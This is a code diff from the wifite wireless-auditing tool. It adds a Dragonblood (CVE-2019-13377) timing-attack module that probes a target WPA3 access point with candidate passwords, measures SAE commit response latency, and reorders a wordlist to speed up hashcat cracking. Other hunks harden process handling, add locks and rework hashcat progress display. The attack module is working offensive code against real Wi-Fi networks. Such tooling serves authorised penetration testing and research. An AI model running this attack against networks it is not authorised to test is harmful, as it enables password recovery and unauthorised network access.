++    Uses wpa_supplicant to send SAE Commit frames with candidate passwords
++    and measures AP response latency from pcap timestamps.  Passwords that
++    map to quadratic residues in MODP groups produce faster AP responses
++    than non-residues, allowing the search space to be partitioned.
++    """
++
++    # Minimum samples needed for meaningful statistics
++    MIN_SAMPLES = 10
++
++    # Default timing threshold percentile (passwords below this are "fast")
++    DEFAULT_THRESHOLD_PERCENTILE = 50
++
++    # Minimum separation (in stdev units) to declare a useful partition
++    MIN_SEPARATION_SIGMA = 0.5
++
++    # Per-probe timeout (seconds)
++    PROBE_TIMEOUT = 8
++
++    # Inter-probe delay (seconds) to avoid AP rate-limiting
++    PROBE_DELAY = 1.5
++
++    def __init__(self, interface: str, target_bssid: str, target_essid: str,
++                 target_channel: int, sae_group: int = 0):
++        from ..config.validators import validate_interface_name
++        validate_interface_name(interface)
++        self.interface = interface
++        self.target_bssid = target_bssid
++        self.target_essid = target_essid
++        self.target_channel = target_channel
++        self.sae_group = sae_group
++
++        self.samples: List[TimingSample] = []
++        self.analysis: Optional[TimingAnalysis] = None
++        self._temp_files: List[str] = []
++
++    # ------------------------------------------------------------------
++    # Public API
++    # ------------------------------------------------------------------
++
++    def run(self, passwords: List[str],
++            num_samples: int = 3,
++            view=None) -> Optional[TimingAnalysis]:
++        """
++        Run timing probes against the target AP.
++
++        For each candidate password, sends *num_samples* SAE Commit frames
++        and records the AP's response latency.
++
++        Args:
++            passwords:   Candidate passwords to probe.
++            num_samples: Repetitions per password (averaged for stability).
++            view:        Optional TUI view for progress updates.
++
++        Returns:
++            TimingAnalysis with fast/slow partitioning, or None on failure.
++        """
++        if not passwords:
++            log_warning('DragonbloodTiming', 'No passwords to probe')
++            return None
++
++        total = len(passwords) * num_samples
++        completed = 0
++
++        log_info('DragonbloodTiming',
++                 f'Starting timing probes: {len(passwords)} passwords x '
++                 f'{num_samples} samples = {total} probes')
++
++        Color.pl('{+} {C}Dragonblood timing attack: probing %d passwords '
++                 '(%d samples each){W}' % (len(passwords), num_samples))
++
++        for pwd in passwords:
++            pwd_times = []
++            for trial in range(num_samples):
++                try:
++                    response_us = self._probe_password(pwd)
++                    if response_us is not None:
++                        pwd_times.append(response_us)
++                        self.samples.append(TimingSample(
++                            password=pwd,
++                            response_time_us=response_us,
++                            sae_group=self.sae_group,
++                            success=True,
++                            timestamp=time.time(),
++                        ))
++                except KeyboardInterrupt:
++                    raise
++                except Exception as e:
++                    log_debug('DragonbloodTiming',
++                              f'Probe failed for candidate: {e}')
++
++                completed += 1
++                if view:
++                    pct = int(completed / total * 100)
++                    view.update_progress({
++                        'status': 'Timing probes',
++                        'metrics': {
++                            'Progress': f'{pct}%',
++                            'Probed': f'{completed}/{total}',
++                            'Samples': len(self.samples),
++                        }
++                    })
++
++                # Delay between probes to avoid triggering AP rate-limits
++                if trial < num_samples - 1:
++                    time.sleep(self.PROBE_DELAY)
++
++            # Log per-password summary
++            if pwd_times:
++                avg = statistics.mean(pwd_times)
++                masked = pwd[:2] + '*' * max(0, len(pwd) - 2)
++                log_debug('DragonbloodTiming',
++                          f'  {masked}: avg={avg:.0f} us  '
++                          f'({len(pwd_times)}/{num_samples} ok)')
++
++            # Small delay between passwords
++            time.sleep(self.PROBE_DELAY)
++
++        # Analyse the collected samples
++        self.analysis = self._analyse()
++        return self.analysis
++
++    def get_prioritised_wordlist(self, wordlist_path: str,
++                                 output_path: Optional[str] = None
++                                 ) -> Optional[str]:
++        """
++        Reorder a wordlist so that timing-fast candidates appear first.
++
++        Reads *wordlist_path*, moves passwords classified as "fast" to the
++        top, then appends the rest.  Writes the result to *output_path*.
++
++        Returns:
++            Path to the reordered wordlist, or None on failure.
++        """
++        if not self.analysis or not self.analysis.fast_passwords:
++            log_warning('DragonbloodTiming',
++                        'No timing analysis available for wordlist reordering')
++            return None
++
++        if not os.path.isfile(wordlist_path):
++            log_error('DragonbloodTiming',
++                      f'Wordlist not found: {wordlist_path}')
++            return None
++
++        fast_set = set(self.analysis.fast_passwords)
++
++        if output_path is None:
++            fd, output_path = tempfile.mkstemp(
++                prefix='dragonblood_wl_', suffix='.txt',
++                dir=Configuration.temp())
++            os.close(fd)
++            self._temp_files.append(output_path)
++
++        try:
++            # First pass: separate fast and slow
++            fast_lines = []
++            slow_lines = []
++            with open(wordlist_path, 'r', errors='replace') as fh:
++                for line in fh:
++                    word = line.rstrip('\n\r')
++                    if word in fast_set:
++                        fast_lines.append(line)
++                    else:
++                        slow_lines.append(line)
++
++            with open(output_path, 'w') as out:
++                for line in fast_lines:
++                    out.write(line)
++                for line in slow_lines:
++                    out.write(line)
++
++            total = len(fast_lines) + len(slow_lines)
++            log_info('DragonbloodTiming',
++                     f'Reordered wordlist: {len(fast_lines)} fast + '
++                     f'{len(slow_lines)} slow = {total} total -> {output_path}')
++
++            Color.pl('{+} {G}Timing-optimised wordlist:{W} '
++                     '{C}%d{W} fast candidates prioritised out of {C}%d{W}'
++                     % (len(fast_lines), total))
++
++            return output_path
++
++        except Exception as e:
++            log_error('DragonbloodTiming',
++                      f'Failed to reorder wordlist: {e}')
++            return None
++
++    def cleanup(self):
++        """Remove temporary files created during the attack."""
++        for path in self._temp_files:
++            try:
++                if os.path.exists(path):
++                    os.remove(path)
++            except OSError:
++                pass
++        self._temp_files.clear()
++
++    # ------------------------------------------------------------------
++    # Timing probe via wpa_supplicant
++    # ------------------------------------------------------------------
++
++    def _probe_password(self, password: str) -> Optional[float]:
++        """
++        Send a single SAE Commit probe and measure AP response time.
++
++        Creates a minimal wpa_supplicant config, starts it briefly, and
++        parses its debug output for SAE commit/confirm timing.
++
++        Returns:
++            Response time in microseconds, or None if probe failed.
++        """
++        config_file = self._write_wpa_config(password)
++        try:
++            return self._measure_sae_timing(config_file)
++        finally:
++            self._remove_temp(config_file)
++
++    def _measure_sae_timing(self, config_file: str) -> Optional[float]:
++        """
++        Run wpa_supplicant briefly and extract SAE exchange timing.
++
++        Parses debug output for timestamps around SAE commit/confirm
++        frames to calculate AP response latency.
++
++        Returns:
++            Latency in microseconds, or None.
++        """
++        cmd = [
++            'wpa_supplicant',
++            '-i', self.interface,
++            '-c', config_file,
++            '-D', 'nl80211',
++            '-dd',  # Extra-verbose debug output
++        ]
++
++        process = Process(cmd, devnull=False)
++        commit_sent_time = None
++        commit_received_time = None
++        start = time.monotonic()
++
++        try:
++            while time.monotonic() - start < self.PROBE_TIMEOUT:
++                if process.poll() is not None:
++                    break
++
++                try:
++                    line = process.pid.stdout.readline()
++                    if not line:
++                        time.sleep(0.05)
++                        continue
++                    if isinstance(line, bytes):
++                        line = line.decode('utf-8', errors='replace')
++
++                    # Detect SAE commit sent
++                    if 'SAE: Sending commit' in line or \
++                       'SME: Trying to authenticate with' in line:
++                        commit_sent_time = time.monotonic()
++                        log_debug('DragonbloodTiming',
++                                  'SAE commit sent detected')
++
++                    # Detect SAE commit response received
++                    if commit_sent_time and (
++                        'SAE: Peer commit' in line or
++                        'SAE: Processing commit' in line
++                    ):
++                        commit_received_time = time.monotonic()
++                        log_debug('DragonbloodTiming',
++                                  'SAE commit response detected')
++                        break
++
++                    # Early termination on auth failure
++                    if '4-Way Handshake failed' in line or \
++                       'CTRL-EVENT-AUTH-REJECT' in line or \
++                       'Authentication with' in line and 'timed out' in line:
++                        break
++
++                except Exception:
++                    time.sleep(0.05)
++
++        finally:
++            import contextlib
++            with contextlib.suppress(Exception):
++                process.interrupt()
++                time.sleep(0.3)
++                if process.poll() is None:
++                    process.kill()
++
++        if commit_sent_time and commit_received_time:
++            delta_us = (commit_received_time - commit_sent_time) * 1_000_000
++            return delta_us
++
++        return None
++
++    # ------------------------------------------------------------------
++    # wpa_supplicant config helpers
++    # ------------------------------------------------------------------
++
++    def _write_wpa_config(self, password: str) -> str:
++        """Create a temporary wpa_supplicant config for one SAE probe.
++
++        Shares formatting with WPA3Detector._build_probe_config so both
++        code paths agree on escaping (prevents ESSID/password values
++        containing quotes or backslashes from corrupting the config).
++        """
++        from ..util.wpa3 import WPA3Detector
++        content = WPA3Detector._build_probe_config(
++            bssid=self.target_bssid,
++            essid=self.target_essid,
++            channel=self.target_channel,
++            sae_group=self.sae_group,
++            password=password,
++        )
++        fd, path = tempfile.mkstemp(
++            prefix='dragon_probe_', suffix='.conf',
++            dir=Configuration.temp())
++        os.write(fd, content.encode('utf-8'))
++        os.close(fd)
++        os.chmod(path, 0o600)
++        return path
++
++    @staticmethod
++    def _channel_to_freq(channel: int) -> int:
++        if channel <= 13:
++            return 2407 + channel * 5
++        elif channel == 14:
++            return 2484
++        elif channel >= 36:
++            return 5000 + channel * 5
++        return 2412
++
++    def _remove_temp(self, path: str):
++        try:
++            if path and os.path.exists(path):
++                os.remove(path)
++        except OSError:
++            pass
++
++    # ------------------------------------------------------------------
++    # Statistical analysis
++    # ------------------------------------------------------------------
++
++    def _analyse(self) -> TimingAnalysis:
++        """
++        Analyse collected timing samples and partition passwords.
++
++        Uses the median response time as the threshold to divide passwords
++        into fast (fewer hunting-and-pecking iterations, likely quadratic
++        residue) and slow (more iterations, likely non-residue) buckets.
++
++        Confidence is derived from the separation between the two clusters
++        relative to overall variance.
++        """
++        analysis = TimingAnalysis()
++
++        if len(self.samples) < self.MIN_SAMPLES:
++            log_warning('DragonbloodTiming',
++                        f'Insufficient samples ({len(self.samples)}) for '
++                        f'meaningful analysis (need {self.MIN_SAMPLES})')
++            analysis.total_samples = len(self.samples)
++            return analysis
++
++        # Compute per-password average response times
++        pwd_times: Dict[str, List[float]] = {}
++        for s in self.samples:
++            pwd_times.setdefault(s.password, []).append(s.response_time_us)
++        pwd_avg = {p: statistics.mean(ts) for p, ts in pwd_times.items()}
++
++        all_avgs = list(pwd_avg.values())
++
++        analysis.total_samples = len(self.samples)
++        analysis.mean_us = statistics.mean(all_avgs)
++        analysis.median_us = statistics.median(all_avgs)
++        analysis.stdev_us = (statistics.stdev(all_avgs)
++                             if len(all_avgs) > 1 else 0.0)
++
++        # Threshold: use median (robust against outliers)
++        analysis.threshold_us = analysis.median_us
++
++        # Partition
++        for pwd, avg in pwd_avg.items():
++            if avg <= analysis.threshold_us:
++                analysis.fast_passwords.append(pwd)
++            else:
++                analysis.slow_passwords.append(pwd)
++
++        n_fast = len(analysis.fast_passwords)
++        n_slow = len(analysis.slow_passwords)
++        total = n_fast + n_slow
++        analysis.partition_ratio = n_fast / total if total else 0.0
++
++        # Compute confidence: how well-separated are the two clusters?
++        if n_fast >= 2 and n_slow >= 2 and analysis.stdev_us > 0:
++            fast_mean = statistics.mean(
++                [pwd_avg[p] for p in analysis.fast_passwords])
++            slow_mean = statistics.mean(
++                [pwd_avg[p] for p in analysis.slow_passwords])
++            separation = abs(slow_mean - fast_mean) / analysis.stdev_us
++            # Normalise to 0..1 (sigma=2 -> confidence=1.0)
++            analysis.confidence = min(1.0, separation / 2.0)
++        else:
++            analysis.confidence = 0.0
++
++        log_info('DragonbloodTiming',
++                 f'Analysis: {analysis.total_samples} samples, '
++                 f'mean={analysis.mean_us:.0f}us, '
++                 f'stdev={analysis.stdev_us:.0f}us, '
++                 f'fast={n_fast}, slow={n_slow}, '
++                 f'confidence={analysis.confidence:.2f}')
++
++        return analysis
++
++    # ------------------------------------------------------------------
++    # Reporting
++    # ------------------------------------------------------------------
++
++    def print_report(self):
++        """Display timing attack results to the user."""
++        if not self.analysis:
++            Color.pl('{!} {O}No timing analysis available{W}')
++            return
++
++        a = self.analysis
++        Color.pl('\n{+} {C}Dragonblood Timing Analysis (CVE-2019-13377):{W}')
++        Color.pl('    Samples collected:  {C}%d{W}' % a.total_samples)
++        Color.pl('    Mean response:      {C}%.0f{W} us' % a.mean_us)
++        Color.pl('    Median response:    {C}%.0f{W} us' % a.median_us)
++        Color.pl('    Std deviation:      {C}%.0f{W} us' % a.stdev_us)
++        Color.pl('    Threshold:          {C}%.0f{W} us' % a.threshold_us)
++        Color.pl('    Fast passwords:     {G}%d{W}' % len(a.fast_passwords))
++        Color.pl('    Slow passwords:     {O}%d{W}' % len(a.slow_passwords))
++        Color.pl('    Partition ratio:    {C}%.1f%%{W} fast' %
++                 (a.partition_ratio * 100))
++
++        if a.confidence >= 0.7:
++            Color.pl('    Confidence:         {G}%.0f%%{W} '
++                     '(strong separation)' % (a.confidence * 100))
++        elif a.confidence >= 0.4:
++            Color.pl('    Confidence:         {O}%.0f%%{W} '
++                     '(moderate separation)' % (a.confidence * 100))
++        else:
++            Color.pl('    Confidence:         {R}%.0f%%{W} '
++                     '(weak separation)' % (a.confidence * 100))
++
++        if a.confidence < self.MIN_SEPARATION_SIGMA / 2.0:
++            Color.pl('\n{!} {O}Timing differences too small for reliable '
++                     'partitioning{W}')
++            Color.pl('{!} {O}AP may have mitigations or network jitter '
++                     'is too high{W}')
++
++    # ------------------------------------------------------------------
++    # Pcap-based timing (alternative to live probing)
++    # ------------------------------------------------------------------
++
++    @staticmethod
++    def extract_timing_from_pcap(capfile: str, bssid: str
++                                  ) -> List[Dict]:
++        """
++        Extract SAE Commit/Confirm frame timestamps from a pcap file.
++
++        Useful for analysing timing from a previously captured exchange
++        without needing to re-probe the AP.
++
++        Returns:
++            List of dicts with 'type' ('commit'/'confirm'), 'src', 'dst',
++            'timestamp' (epoch float), 'sae_group'.
++        """
++        from ..tools.tshark import Tshark
++        if not Tshark.exists():
++            return []
++
++        try:
++            bssid_filter = f' && wlan.bssid == {bssid}' if bssid else ''
++            filter_str = (
++                'wlan.fc.type_subtype == 0x0b && '
++                'wlan.fixed.auth.alg == 3'
++                + bssid_filter
++            )
++
++            command = [
++                'tshark', '-r', capfile,
++                '-Y', filter_str,
++                '-T', 'fields',
++                '-e', 'frame.time_epoch',
++                '-e', 'wlan.sa',
++                '-e', 'wlan.da',
++                '-e', 'wlan.fixed.auth.seq',
++                '-e', 'wlan.fixed.auth.sae.group',
++            ]
++            proc = Process(command, devnull=False)
++            output = proc.stdout()
++
++            frames = []
++            for line in output.split('\n'):
++                line = line.strip()
++                if not line:
++                    continue
++                parts = line.split('\t')
++                if len(parts) < 4:
++                    continue
++                seq = parts[3].strip() if parts[3] else ''
++                frame_type = 'commit' if seq == '1' else 'confirm'
++                frames.append({
++                    'type': frame_type,
++                    'timestamp': float(parts[0]) if parts[0] else 0.0,
++                    'src': parts[1],
++                    'dst': parts[2],
++                    'seq': seq,
++                    'sae_group': int(parts[4]) if len(parts) > 4 and parts[4] else 0,
++                })
++
++            return frames
++
++        except Exception as e:
++            log_debug('DragonbloodTiming',
++                      f'Pcap timing extraction failed: {e}')
++            return []
++
++    @staticmethod
++    def compute_pcap_response_times(frames: List[Dict], ap_bssid: str
++                                     ) -> List[float]:
++        """
++        Compute AP response latencies from extracted pcap frame pairs.
++
++        Pairs each client-sent SAE Commit with the next AP-sent SAE Commit
++        and returns the time deltas in microseconds.
++        """
++        deltas = []
++        pending_client_commit = None
++
++        for f in sorted(frames, key=lambda x: x['timestamp']):
++            if f['type'] != 'commit':
++                continue
++            # Client -> AP commit
++            if f['src'] != ap_bssid and f['dst'] == ap_bssid:
++                pending_client_commit = f['timestamp']
++            # AP -> Client commit (response)
++            elif f['src'] == ap_bssid and pending_client_commit is not None:
++                delta_us = (f['timestamp'] - pending_client_commit) * 1_000_000
++                if delta_us > 0:
++                    deltas.append(delta_us)
++                pending_client_commit = None
++
++        return deltas
+diff --git a/wifite/util/interface_manager.py b/wifite/util/interface_manager.py
+index 9537687a8..a6895b087 100755
+--- a/wifite/util/interface_manager.py
++++ b/wifite/util/interface_manager.py
+@@ -377,17 +377,20 @@ class InterfaceManager:
+     def set_interface_mode(self, interface: str, mode: str) -> bool:
+         """
+         Set interface to a specific mode.
+-        
++
+         Tracks state changes for cleanup.
+-        
++
+         Args:
+             interface: Interface name
+             mode: Mode to set ('managed', 'monitor', 'AP', 'ad-hoc', 'mesh')
+-            
++
+         Returns:
+             True if successful, False otherwise
+         """
+         try:
++            from ..config.validators import validate_interface_name
++            validate_interface_name(interface)
++
+             # Task 11.3: Log each configuration step
+             log_info('InterfaceManager', f'Configuration step: Setting {interface} to {mode} mode')
+             
+diff --git a/wifite/util/memory.py b/wifite/util/memory.py
+index 8c5521a93..4138012f9 100755
+--- a/wifite/util/memory.py
++++ b/wifite/util/memory.py
+@@ -11,6 +11,7 @@ and garbage collection for long-running operations like infinite mode.
+ import gc
+ import os
+ import time
++import threading
+ from typing import Optional, Dict, Any
+ from ..config import Configuration
+ 
+@@ -34,6 +35,9 @@ class MemoryMonitor:
+     CLEANUP_INTERVAL_SCANS = 50  # Every N scan cycles
+     GC_INTERVAL_SCANS = 100  # Force GC every N scan cycles
+ 
++    # Lock for class-level state to prevent races from multiple threads
++    _state_lock = threading.Lock()
++
+     # State tracking
+     _last_cleanup_time: float = 0
+     _last_gc_time: float = 0
+@@ -142,17 +146,19 @@ class MemoryMonitor:
+         performed_cleanup = False
+         current_time = time.time()
+ 
+-        # Check if it's time for periodic cleanup
+-        should_cleanup = (
+-            scan_count > 0 and scan_count % cls.CLEANUP_INTERVAL_SCANS == 0
+-        ) or (
+-            current_time - cls._last_cleanup_time > 60  # At least every 60 seconds
+-        )
++        with cls._state_lock:
++            # Check if it's time for periodic cleanup
++            should_cleanup = (
++                scan_count > 0 and scan_count % cls.CLEANUP_INTERVAL_SCANS == 0
++            ) or (
++                current_time - cls._last_cleanup_time > 60  # At least every 60 seconds
++            )
++
++            if not should_cleanup:
++                return False
+ 
+-        if not should_cleanup:
+-            return False
++            cls._last_cleanup_time = current_time
+ 
+-        cls._last_cleanup_time = current_time
+         status = cls.check_memory_status()
+ 
+         # Log status in verbose mode
+@@ -164,51 +170,55 @@ class MemoryMonitor:
+                 status['fd_usage_percent']
+             ))
+ 
+-        # Critical memory - force aggressive cleanup
+-        if status['memory_critical']:
+-            if not cls._warning_shown:
+-                Color.pl('{!} {R}Critical memory usage: %.1f MB{W}' % status['memory_mb'])
+-                Color.pl('{!} {O}Triggering aggressive cleanup...{W}')
+-                cls._warning_shown = True
+-
+-            cls._aggressive_cleanup()
+-            performed_cleanup = True
+-
+-        # High memory warning
+-        elif status['memory_warning']:
+-            if not cls._warning_shown:
+-                Color.pl('{!} {O}High memory usage: %.1f MB{W}' % status['memory_mb'])
+-                cls._warning_shown = True
+-
+-            cls._standard_cleanup()
+-            performed_cleanup = True
+-
+-        # High FD usage
+-        elif status['fd_warning']:
+-            if Configuration.verbose > 0:
+-                Color.pl('{!} {O}High FD usage: %d/%d{W}' % (
+-                    status['fd_count'], status['fd_soft_limit']
+-                ))
+-
+-            cls._fd_cleanup()
+-            performed_cleanup = True
+-
+-        # Periodic GC
+-        elif scan_count > 0 and scan_count % cls.GC_INTERVAL_SCANS == 0:
+-            collected = gc.collect()
+-            if Configuration.verbose > 1:
+-                Color.pl('{+} {D}Periodic GC: collected %d objects{W}' % collected)
+-            performed_cleanup = True
+-
+-        # Reset warning flag if memory is back to normal
+-        if not status['memory_warning'] and not status['memory_critical']:
+-            cls._warning_shown = False
++        with cls._state_lock:
++            # Critical memory - force aggressive cleanup
++            if status['memory_critical']:
++                if not cls._warning_shown:
++                    Color.pl('{!} {R}Critical memory usage: %.1f MB{W}' % status['memory_mb'])
++                    Color.pl('{!} {O}Triggering aggressive cleanup...{W}')
++                    cls._warning_shown = True
++
++                cls._aggressive_cleanup()
++                performed_cleanup = True
++
++            # High memory warning
++            elif status['memory_warning']:
++                if not cls._warning_shown:
++                    Color.pl('{!} {O}High memory usage: %.1f MB{W}' % status['memory_mb'])
++                    cls._warning_shown = True
++
++                cls._standard_cleanup()
++                performed_cleanup = True
++
++            # High FD usage
++            elif status['fd_warning']:
++                if Configuration.verbose > 0:
++                    Color.pl('{!} {O}High FD usage: %d/%d{W}' % (
++                        status['fd_count'], status['fd_soft_limit']
++                    ))
++
++                cls._fd_cleanup()
++                performed_cleanup = True
++
++            # Periodic GC
++            elif scan_count > 0 and scan_count % cls.GC_INTERVAL_SCANS == 0:
++                collected = gc.collect()
++                if Configuration.verbose > 1:
++                    Color.pl('{+} {D}Periodic GC: collected %d objects{W}' % collected)
++                performed_cleanup = True
++
++            # Reset warning flag if memory is back to normal
++            if not status['memory_warning'] and not status['memory_critical']:
++                cls._warning_shown = False
+ 
+         return performed_cleanup
+ 
+     @classmethod
+     def _standard_cleanup(cls):
+-        """Perform standard memory cleanup."""
++        """Perform standard memory cleanup.
++
++        Callers must hold cls._state_lock.
++        """
+         from ..util.process import ProcessManager, Process
+         from ..util.color import Color
+ 
+@@ -228,10 +238,13 @@ class MemoryMonitor:
+ 
+     @classmethod
+     def _aggressive_cleanup(cls):
+-        """Perform aggressive memory cleanup for critical situations."""
++        """Perform aggressive memory cleanup for critical situations.
++
++        Callers must hold cls._state_lock.
++        """
+         from ..util.process import ProcessManager, Process
+         from ..util.color import Color
+-        
++
+         cls._cleanup_count += 1
+         
+         # Force cleanup of all processes
+diff --git a/wifite/util/process.py b/wifite/util/process.py
+index aa3719797..d9534a1da 100755
+--- a/wifite/util/process.py
++++ b/wifite/util/process.py
+@@ -21,7 +21,7 @@ from ..util.logger import log_debug, log_info, log_warning, log_error
+ class ProcessManager:
+     """Global process manager to track and cleanup all processes"""
+     _instance = None
+-    _lock = threading.Lock()
++    _lock = threading.RLock()  # Reentrant lock to prevent deadlocks during nested cleanup
+ 
+     # Maximum number of concurrent processes
+     MAX_PROCESSES = 100
+@@ -160,24 +160,23 @@ class Process:
+         Args:
+             command: Command string or list of args.
+             cwd: Working directory for the command.
+-            shell: If True, run via shell (use with caution).
++            shell: Deprecated, ignored. All commands run without shell.
+             timeout: Seconds before the subprocess is killed. Default 30. None for no timeout.
+ 
+-        String commands are always split via shlex before being passed to Popen when shell=False.
++        String commands are always split via shlex before being passed to Popen.
+         """
+-        if isinstance(command, str) and not shell:
+-            # Split string commands into list of args for Popen when not using shell mode
++        if shell:
++            log_warning('Process', 'Process.call(): shell=True is ignored for security; command will be split via shlex')
++
++        if isinstance(command, str):
+             if Configuration.verbose > 1:
+                 Color.pe(f'\n {{C}}[?]{{W}} Executing: {{B}}{command}{{W}}')
+             command = shlex.split(command)
+-        elif shell:
+-            if Configuration.verbose > 1:
+-                Color.pe(f'\n {{C}}[?] {{W}} Executing (Shell): {{B}}{command}{{W}}')
+         else:
+             if Configuration.verbose > 1:
+                 Color.pe(f'\n {{C}}[?]{{W}} Executing: {{B}}{command}{{W}}')
+ 
+-        with Popen(command, cwd=cwd, stdout=PIPE, stderr=PIPE, shell=shell) as pid:
++        with Popen(command, cwd=cwd, stdout=PIPE, stderr=PIPE) as pid:
+             try:
+                 out, err = pid.communicate(timeout=timeout)
+             except subprocess.TimeoutExpired:
+@@ -575,7 +574,7 @@ if __name__ == '__main__':
+     out, err = Process.call(['ls', '-lah'])
+     print(out, err)
+ 
+-    out, err = Process.call('ls -l | head -2')
++    out, err = Process.call('ls -l')
+     print(out, err)
+ 
+     print(f'"reaver" exists: {Process.exists("reaver")}')
+diff --git a/wifite/util/sae_crack.py b/wifite/util/sae_crack.py
+index 6a9c7b102..a42014601 100755
+--- a/wifite/util/sae_crack.py
++++ b/wifite/util/sae_crack.py
+@@ -15,7 +15,7 @@ from typing import Optional, Dict, Any, List
+ 
+ from ..config import Configuration
+ from ..model.sae_handshake import SAEHandshake
+-from ..tools.hashcat import Hashcat, HcxPcapngTool
++from ..tools.hashcat import Hashcat, HashcatCracker, HcxPcapngTool
+ from ..util.color import Color
+ from ..util.process import Process
+ 
+@@ -47,7 +47,6 @@ class SAECracker:
+         self.wordlist = wordlist or Configuration.wordlist
+         self.hash_file = None
+         self.cracked_key = None
+-        self.progress_data = {}
+         
+     @staticmethod
+     def crack_sae_handshake(
+@@ -234,68 +233,81 @@ class SAECracker:
+         verbose: bool = True
+     ) -> Optional[str]:
+         """
+-        Run hashcat with specified parameters.
+-        
+-        Args:
+-            attack_mode: Hashcat attack mode (0=dictionary, 3=mask)
+-            wordlist: Path to wordlist (for dictionary attacks)
+-            rules: Path to rules file (optional)
+-            mask: Mask pattern (for mask attacks)
+-            show_command: Whether to display the command
+-            verbose: Whether to display progress
+-        
+-        Returns:
+-            Cracked password if successful, None otherwise
++        Run hashcat and return the cracked password, or None.
++
++        Dictionary attacks (mode 0) without rules route through
++        HashcatCracker so progress is streamed via --status-timer and the
++        caller's stdout pipe isn't force-closed mid-crack. Rules and mask
++        attacks (rarely used, currently no production callers) still go
++        through a plain one-shot subprocess that doesn't show progress.
+         """
++        # Fast path: dictionary attack with optional progress display
++        if attack_mode == '0' and wordlist and not rules:
++            return self._run_dictionary_with_progress(
++                wordlist, show_command=show_command, verbose=verbose)
++
++        return self._run_hashcat_oneshot(
++            attack_mode, wordlist=wordlist, rules=rules, mask=mask,
++            show_command=show_command)
++
++    def _run_dictionary_with_progress(
++        self,
++        wordlist: str,
++        show_command: bool = False,
++        verbose: bool = True,
++    ) -> Optional[str]:
++        """Dictionary crack using HashcatCracker with live STATUS streaming."""
++        with HashcatCracker(self.hash_file, wordlist, mode=self.HASHCAT_MODE) as cracker:
++            cracker.start(show_command=show_command)
++            try:
++                while not cracker.is_finished():
++                    if verbose:
++                        status = cracker.poll_status()
++                        Color.clear_entire_line()
++                        Color.p(
++                            '\r{+} {C}Cracking SAE:{W} %5.1f%%  '
++                            '{C}Speed:{W} %s  {C}ETA:{W} %s'
++                            % (status['progress'] * 100,
++                               status['speed'], status['eta']))
++                    time.sleep(cracker.STATUS_TIMER_SECONDS)
++            except KeyboardInterrupt:
++                Color.pl('')
++                raise
++            if verbose:
++                Color.pl('')  # terminate the progress line
++            return cracker.get_result()
++
++    def _run_hashcat_oneshot(
++        self,
++        attack_mode: str,
++        wordlist: Optional[str] = None,
++        rules: Optional[str] = None,
++        mask: Optional[str] = None,
++        show_command: bool = False,
++    ) -> Optional[str]:
++        """Plain blocking hashcat run — for rules/mask paths only."""
+         command = [
+             'hashcat',
+             '-m', self.HASHCAT_MODE,
+             '-a', attack_mode,
+-            self.hash_file
++            self.hash_file,
+         ]
+-        
+-        # Add wordlist for dictionary attacks
+         if attack_mode == '0' and wordlist:
+             command.append(wordlist)
+-        
+-        # Add mask for mask attacks
+         if attack_mode == '3' and mask:
+             command.append(mask)
+-        
+-        # Add rules if specified
+         if rules:
+             command.extend(['-r', rules])
+-        
+-        # Add GPU workload profile
+-        if Configuration.wpa_attack_timeout > 0:
+-            command.extend(['-w', '3'])  # High performance
+-        
+-        # Add force flag if needed
++        command.extend(['-w', '3'])
+         if Hashcat.should_use_force():
+             command.append('--force')
+-        
+-        # Add status output for progress monitoring
+-        if verbose:
+-            command.extend(['--status', '--status-timer', '5'])
+-        else:
+-            command.append('--quiet')
+-        
++
+         if show_command:
+             Color.pl('{+} {D}Running: {W}{P}%s{W}' % ' '.join(command))
+-        
+-        # Run hashcat
++
+         proc = Process(command, devnull=False)
+-        
+-        if verbose:
+-            # Monitor progress
+-            self._monitor_progress(proc)
+-        else:
+-            proc.wait()
+-        
+-        # Check output for cracked password
+-        stdout = proc.stdout()
+-        stderr = proc.stderr()
+-        
++        proc.wait()
++        stdout, stderr = proc.get_output()
+         return self._parse_cracked_password(stdout, stderr)
+     
+     def _check_pot_file(self, show_command: bool = False) -> Optional[str]:
+@@ -360,110 +372,6 @@ class SAECracker:
+         
+         return None
+     
+-    def _monitor_progress(self, proc: Process):
+-        """
+-        Monitor hashcat progress and display updates.
+-        
+-        Args:
+-            proc: Running hashcat process
+-        """
+-        last_update = time.time()
+-        update_interval = 5  # seconds
+-        
+-        while proc.poll() is None:
+-            time.sleep(0.5)
+-            
+-            # Update progress every interval
+-            if time.time() - last_update >= update_interval:
+-                progress = self._get_progress(proc)
+-                if progress:
+-                    self._display_progress(progress)
+-                last_update = time.time()
+-        
+-        # Final update
+-        progress = self._get_progress(proc)
+-        if progress:
+-            self._display_progress(progress)
+-    
+-    def _get_progress(self, proc: Process) -> Optional[Dict[str, Any]]:
+-        """
+-        Extract progress information from hashcat output.
+-        
+-        Args:
+-            proc: Running hashcat process
+-        
+-        Returns:
+-            Dictionary with progress data, or None if unavailable
+-        """
+-        try:
+-            output = proc.stdout()
+-            
+-            progress_data = {}
+-            
+-            # Parse status output
+-            for line in output.split('\n'):
+-                line = line.strip()
+-                
+-                # Extract progress percentage
+-                if 'Progress' in line and '/' in line:
+-                    match = re.search(r'(\d+)/(\d+)\s*\((\d+\.\d+)%\)', line)
+-                    if match:
+-                        progress_data['current'] = int(match.group(1))
+-                        progress_data['total'] = int(match.group(2))
+-                        progress_data['percent'] = float(match.group(3))
+-                
+-                # Extract time remaining
+-                if 'Time.Estimated' in line:
+-                    match = re.search(r'Time\.Estimated\.+:\s*(.+)', line)
+-                    if match:
+-                        progress_data['eta'] = match.group(1).strip()
+-                
+-                # Extract speed
+-                if 'Speed.#' in line or 'Speed.Dev' in line:
+-                    match = re.search(r'Speed\..*:\s*(\d+\.?\d*\s*\w+/s)', line)
+-                    if match:
+-                        progress_data['speed'] = match.group(1).strip()
+-                
+-                # Extract recovered count
+-                if 'Recovered' in line:
+-                    match = re.search(r'Recovered\.+:\s*(\d+)/(\d+)', line)
+-                    if match:
+-                        progress_data['recovered'] = int(match.group(1))
+-                        progress_data['total_hashes'] = int(match.group(2))
+-            
+-            return progress_data if progress_data else None
+-            
+-        except Exception:
+-            return None
+-    
+-    def _display_progress(self, progress: Dict[str, Any]):
+-        """
+-        Display progress information to user.
+-        
+-        Args:
+-            progress: Dictionary with progress data
+-        """
+-        self.progress_data = progress
+-        
+-        # Build progress message
+-        msg_parts = []
+-        
+-        if 'percent' in progress:
+-            msg_parts.append('{C}Progress:{W} {G}%.1f%%{W}' % progress['percent'])
+-        
+-        if 'speed' in progress:
+-            msg_parts.append('{C}Speed:{W} {G}%s{W}' % progress['speed'])
